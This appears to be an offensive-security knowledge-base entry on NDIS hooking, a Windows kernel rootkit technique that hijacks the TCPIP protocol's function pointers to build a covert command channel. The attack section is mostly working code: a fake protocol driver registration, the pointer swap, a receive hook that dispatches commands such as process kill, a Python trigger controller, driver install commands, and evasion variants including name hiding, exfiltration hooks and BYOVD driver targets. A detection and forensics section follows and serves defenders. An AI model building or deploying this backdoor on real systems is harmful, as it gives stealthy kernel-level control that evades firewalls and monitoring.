---
title: "NDIS Hooking — Kernel Network Stack Interception"
type: technique
tags: [c2, covert-channel, git-poc, kernel, network, post-exploitation, rootkit, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [git-ndishook]
---

# NDIS Hooking — Kernel Network Stack Interception

## What It Is

**NDIS hooking** is a kernel-mode technique that hijacks the Windows Network Driver Interface Specification (NDIS) stack by swapping function pointers inside undocumented internal structures. The result is a covert C2 channel that intercepts raw TCP traffic on any already-open port — without creating new sockets, opening new ports, or touching userland.

Notably used by the **Daxin** backdoor (attributed to Chinese state actors, discovered 2022) and pre-PatchGuard rootkits such as Uroburos/Turla. See also: [[aws-attacks]] (SSRF to IMDS is a cloud-layer analogue of operating below detection).

---

## How It Works

Windows routes all network I/O through a layered driver stack:

```
User-space app
   ↓
Winsock / AFD.sys
   ↓
tcpip.sys  (TCPIP protocol driver — owns the NDIS_OPEN_BLOCK)
   ↓
NDIS.sys   (Network Driver Interface Specification — switching fabric)
   ↓
NIC miniport driver
```

Every protocol registered with NDIS receives a `NDIS_HANDLE` from `NdisRegisterProtocolDriver`. This handle is officially typed as an opaque pointer, but it actually points to an undocumented `_NDIS_PROTOCOL_BLOCK` structure. These blocks form a **singly-linked list** (`NextProtocol` field) of every registered network protocol driver.

### Key undocumented structures

```
_NDIS_PROTOCOL_BLOCK
  +0x000  Header           (NDIS_OBJECT_HEADER)
  +0x008  ProtocolDriverContext
  +0x010  NextProtocol     → _NDIS_PROTOCOL_BLOCK*  ← linked list walk
  +0x018  OpenQueue        → _NDIS_OPEN_BLOCK*       ← target for hooking
  +0x048  Name             (UNICODE_STRING)           ← used to find "TCPIP"

_NDIS_OPEN_BLOCK
  +0x208  prot_send_net_buffer_list_complete   ← outbound hook target
  +0x210  (pad)
  +0x218  (pad)
  +0x220  recieve_net_buffer_lists             ← inbound hook target
```

The `_NDIS_OPEN_BLOCK` belonging to the `TCPIP` protocol block owns the live function pointers that NDIS calls for every inbound and outbound packet. Swapping these pointers installs a kernel-level packet intercept with no WFP, no Winsock, no userland visibility.

---

## Attack Phases

- **Post-exploitation** — primary use: persistence, covert C2, process kill, lateral movement trigger
- **Exploitation** — can be delivered as a dropper payload; requires kernel execution context

---

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Kernel execution | Must be running as a kernel-mode driver (`.sys`) |
| Code signing | Requires **Test Signing Mode** (`bcdedit /set testsigning on`) or a kernel code-signing bypass (BYOVD, DSE patch, bootkit) |
| Structure offsets | `_NDIS_PROTOCOL_BLOCK` and `_NDIS_OPEN_BLOCK` offsets are **version-specific** — hardcoded in PoC for tested Windows build |
| TCPIP loaded | `tcpip.sys` must be loaded (always true on a networked system) |
| Open TCP port | At least one TCP port must be open on the target to receive trigger packets |

---

## Methodology

### Step 1 — Register a Fake Protocol Driver

Call `NdisRegisterProtocolDriver` with a dummy characteristics struct. Most callbacks are null; the driver name is arbitrary. The call returns a `NDIS_HANDLE` which is really a `_NDIS_PROTOCOL_BLOCK*`.

```cpp
NDIS_PROTOCOL_DRIVER_CHARACTERISTICS chars = {};
chars.Header.Type     = NDIS_OBJECT_TYPE_PROTOCOL_DRIVER_CHARACTERISTICS;
chars.Header.Revision = NDIS_PROTOCOL_DRIVER_CHARACTERISTICS_REVISION_2;
chars.Header.Size     = NDIS_SIZEOF_PROTOCOL_DRIVER_CHARACTERISTICS_REVISION_2;
chars.MajorNdisVersion = 6;
chars.MinorNdisVersion = 60;
RtlInitUnicodeString(&chars.Name, L"FAKEPROTOCOL");
// Only mandatory callbacks need to be non-null
chars.BindAdapterHandlerEx   = ProtoBindAdapterEx;
chars.UnbindAdapterHandlerEx = ProtoUnbindAdapterEx;
// ... other mandatory stubs ...

NDIS_HANDLE g_handle = nullptr;
NdisRegisterProtocolDriver(nullptr, &chars, &g_handle);
// g_handle is actually _NDIS_PROTOCOL_BLOCK* for "FAKEPROTOCOL"
```

### Step 2 — Walk the Protocol Linked List to Find TCPIP

```cpp
auto* block = (PNDIS_PROTOCOL_BLOCK)g_handle;
do {
    if (!wcscmp(block->name.Buffer, L"TCPIP")) {
        // Found it — block->open_queue is _NDIS_OPEN_BLOCK*
        break;
    }
    block = block->next_protocol;
} while (block);
```

### Step 3 — Swap Function Pointers (Hook Install)

```cpp
// Save originals for cleanup and call-through
original_receive = block->open_queue->recieve_net_buffer_lists;
original_send    = block->open_queue->prot_send_net_buffer_list_complete;

// Install hooks
block->open_queue->recieve_net_buffer_lists = my_receive_hook;
// block->open_queue->prot_send_net_buffer_list_complete = my_send_hook;  // optional
```

### Step 4 — Receive Hook: Parse Packets and Dispatch Commands

Every inbound TCP NBL now passes through your hook. The hook walks the NBL → NB chain, extracts raw packet data, and looks for a magic byte prefix:

```cpp
void my_receive_hook(NDIS_HANDLE ctx, PNET_BUFFER_LIST nbl,
                     NDIS_PORT_NUMBER port, ULONG count, ULONG flags) {
    for (auto* cur = nbl; cur; cur = NET_BUFFER_LIST_NEXT_NBL(cur)) {
        for (auto* nb = NET_BUFFER_LIST_FIRST_NB(cur); nb; nb = NET_BUFFER_NEXT_NB(nb)) {
            ULONG len = NET_BUFFER_DATA_LENGTH(nb);
            // NdisGetDataBuffer returns contiguous buffer — avoids MDL walking
            PUCHAR data = (PUCHAR)NdisGetDataBuffer(nb, len, NULL, 1, 0);
            if (!data) continue;

            tcp_packet pkt;
            if (!parse_tcp_packet(data, len, &pkt)) continue;          // ETH→IP→TCP
            if (!tcp_payload_starts_with(pkt, magic, magic_len)) continue; // magic check

            ParsedCommand cmd;
            if (!parse_command(pkt.payload, pkt.payload_len, &cmd)) continue;

            switch (cmd.command) {
                case Command::KILL: { /* ZwTerminateProcess / TerminateProcess */ break; }
                // extensible: shell, inject, exfil, pivot ...
            }
        }
    }
    // Always call through — otherwise the OS network stack breaks
    original_receive(ctx, nbl, port, count, flags);
}
```

### Step 5 — Send Trigger Packets from the Attacker

The trigger packet travels over any existing open TCP connection. Wire format:

```
MAGIC | COMMAND | ARGS
MP5   | KILL    | 1234
```

Python controller example:

```python
import socket

MAGIC = b"MP5"
DELIM = b"|"

def send_command(ip, port, command, args=""):
    parts = [MAGIC, command.encode("ascii")]
    if args:
        parts.append(args.encode("ascii"))
    payload = DELIM.join(parts)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.sendall(payload)

# Kill PID 1234 via NetBIOS port (139)
send_command("192.168.1.50", 139, "KILL", "1234")
```

Any TCP port already bound on the target works — HTTP (80), SMB (445), NetBIOS (139), RPC (135), etc.

### Step 6 — Hook Cleanup on Driver Unload

```cpp
void driver_unload(PDRIVER_OBJECT obj) {
    // Walk list again to find TCPIP and restore originals
    auto* block = (PNDIS_PROTOCOL_BLOCK)g_handle;
    while (block) {
        if (!wcscmp(block->name.Buffer, L"TCPIP")) {
            block->open_queue->recieve_net_buffer_lists = original_receive;
            block->open_queue->prot_send_net_buffer_list_complete = original_send;
            break;
        }
        block = block->next_protocol;
    }
}
```

---

## Key Payloads / Examples

### Install and start the driver (requires admin + test signing)

```cmd
bcdedit /set testsigning on
:: (reboot required)

sc.exe create NdisHook binPath=C:\path\to\NdisHook.sys type=kernel
sc.exe start NdisHook
```

### Run controller against any open TCP port

```bash
# python controller.py <target-ip> <open-tcp-port>
python controller.py 192.168.1.50 139

controller > kill 4892
```

### Packet header parsing (ETH → IPv4 → TCP)

The raw NBL payload is a full Ethernet frame. To reach the TCP payload you must strip:
- 14 bytes Ethernet header
- variable-length IPv4 header (`IHL` field × 4, usually 20 bytes)
- variable-length TCP header (`data offset` field × 4, usually 20 bytes)

```cpp
struct ethernet_header { UCHAR dst[6]; UCHAR src[6]; USHORT ethertype; };
struct ipv4_header     { UCHAR version_ihl; /* ... */ UCHAR protocol; /* ... */ };
struct tcp_header      { USHORT src_port; USHORT dst_port; /* ... */ UCHAR data_offset_reserved; };

// EtherType big-endian 0x0800 = IPv4; protocol byte 6 = TCP
// ipv4 IHL: lower nibble of version_ihl × 4 = header bytes
// tcp data offset: upper nibble of data_offset_reserved × 4 = header bytes
```

---

## Bypasses and Variants

### Hiding the protocol name

The `FAKEPROTOCOL` name string is visible to kernel debuggers. A stealthier implementation would:
- Use a name that mimics a real protocol (`MSRPC`, `SMB`, `LLTDIO`)
- Zero out the name buffer after registration (access the struct directly)

### Targeting UDP / non-TCP protocols

The same walk applies for UDP — find the TCPIP block's `OpenQueue` and look for the UDP receive handler. IPv6 similarly uses a separate protocol block.

### Daxin-style SYN covert channel

Daxin didn't use TCP payload magic bytes. Instead it inspected **SYN packet sequence numbers** — a legitimate-looking SYN with a specific sequence number value would trigger C2 mode. This is lower-signal for IDS because the SYN never completes a connection. The driver then hijacks the connection for C2 before the OS processes it.

### Outbound data exfiltration hook

The `prot_send_net_buffer_list_complete` hook intercepts all outbound NBLs. This can be used to:
- Inspect outbound traffic for secrets (passwords in cleartext HTTP)
- Inject data into outbound packets (data exfiltration piggy-backed onto legitimate traffic)
- Silently drop or modify packets (firewall bypass, censorship)

### BYOVD delivery (Bring Your Own Vulnerable Driver)

To bypass DSE without test signing mode, attackers load a legitimately-signed but vulnerable driver, exploit it to disable DSE, then load the unsigned rootkit. Common BYOVD targets: `gdrv.sys` (Gigabyte), `AsrDrv104.sys` (ASRock), `speedfan.sys`.

---

## Detection and Defence

### Static indicators

| Indicator | Where to look |
|-----------|---------------|
| `NdisRegisterProtocolDriver` with null/stub callbacks | Static analysis of `.sys` binary imports |
| Unknown entry in `_NDIS_PROTOCOL_BLOCK` linked list | Kernel debugger: walk `ndis!g_ndisProtocolList` |
| Function pointer mismatch in `_NDIS_OPEN_BLOCK` | Compare stored pointer to known `tcpip.sys` + `NDIS.sys` code ranges |
| Signed driver with unknown certificate | Check `NdisHook.cer` or unrecognised CA in driver signing |

### Kernel debugger analysis (WinDbg)

```
// Dump the NDIS protocol linked list
0: kd> dt ndis!_NDIS_PROTOCOL_BLOCK -l NextProtocol Name OpenQueue

// For each block, check open_queue function pointers
// If recieve_net_buffer_lists points outside tcpip.sys address range → hooked
0: kd> lm m tcpip    // get tcpip.sys base/size
0: kd> lm m ndis     // get ndis.sys base/size
```

### Volatility (memory forensics)

No out-of-the-box Volatility plugin targets NDIS function pointers, but a custom plugin can:
1. Find `ndis!g_ndisProtocolList` symbol
2. Walk `_NDIS_PROTOCOL_BLOCK` linked list
3. For each block's `OpenQueue`, check that all function pointers resolve inside expected driver ranges

### ETW / telemetry

- **Kernel ETW**: `NdisRegisterProtocolDriver` emits an event. Unknown or abnormally-named protocols are suspicious.
- **PatchGuard**: protects kernel code pages and some system data structures — but `_NDIS_OPEN_BLOCK` is in **paged pool / heap** (not a PatchGuard-protected section), so the hook survives PatchGuard.
- **Driver Signature Enforcement (DSE)**: the single most effective prevention. Without BYOVD or Secure Boot compromise, unsigned drivers cannot load on production systems.

### Network-level detection (limited)

- Magic bytes in TCP payload (`MP5|`) are detectable by IDS/DPI — but trivially changed.
- Daxin-style SYN sequence number covert channel is nearly invisible to network monitoring without access to the expected SYN sequence ranges.
- No new ports open, no new processes, no new sockets — purely in-driver.

---

## Tools

| Tool | Role |
|------|------|
| NdisHook (PoC) | Reference implementation; `raw/git/NdisHook/` |
| WinDbg | Kernel debugging and structure inspection |
| Volatility | Memory forensics; custom plugin needed |
| OSR Driver Loader | Load test-signed drivers without service creation |
| DriverView (Nirsoft) | List loaded kernel modules — detect unknown `.sys` |
| `sc.exe` | Create and start driver service (attacker delivery) |
| `bcdedit` | Enable test signing mode |

---

## Real-World Malware Context

### Daxin (2022, Chinese APT)

- Discovered by Symantec/Broadcom; attributed to Chinese state actors (possibly Witchetty/APT10 cluster)
- Used NDIS hooking to piggyback on **existing TCP connections** — no listening ports, no new sockets
- Trigger mechanism: SYN packets with specific sequence number values (not payload magic)
- Once triggered, driver hijacked the full TCP stream before the OS stack could process it
- Built-in onion-routing capability: could relay traffic through multiple compromised hosts
- Considered one of the most sophisticated kernel-level backdoors ever analysed publicly

### Uroburos / Turla Snake (2014–)

- Russian APT (FSB) toolkit
- Also used kernel network hooks for covert C2
- Persistence via kernel driver; encrypted virtual filesystem inside Windows raw disk sectors

### Black Hat 2006 — Attacking Personal Firewalls

- Alexander Tereshkin demonstrated NDIS hook attacks against PFW software
- Showed that NDIS-level hooks could bypass all host-based firewalls (which sat above NDIS in the stack)

---

## Sources

- `raw/git/NdisHook/` — NdisHook PoC by RainbowDynamix (2024)
- [Symantec: Daxin Backdoor In-Depth Analysis](https://www.security.com/threat-intelligence/daxin-malware-espionage-analysis)
- [BlackHat 2006 — Rootkits: Attacking Personal Firewalls](https://blackhat.com/presentations/bh-usa-06/BH-US-06-Tereshkin.pdf)
